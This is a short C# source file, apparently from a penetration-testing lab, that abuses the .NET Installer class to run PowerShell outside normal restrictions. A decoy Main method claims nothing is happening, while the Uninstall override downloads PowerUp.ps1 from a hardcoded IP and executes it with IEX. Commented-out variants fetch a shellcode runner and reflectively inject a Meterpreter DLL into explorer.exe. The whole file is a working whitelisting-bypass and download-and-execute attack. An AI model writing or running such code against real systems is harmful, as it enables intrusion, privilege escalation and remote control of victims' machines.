using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Nothing going on in this binary.");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            //String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.45.168/run.txt') | iex"; // run.txt is simple_shellcode_runner/simple_shellcode_runner.ps1
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.168/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Windows\\Tasks\\test.txt";
            //String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.102/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.49.102/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
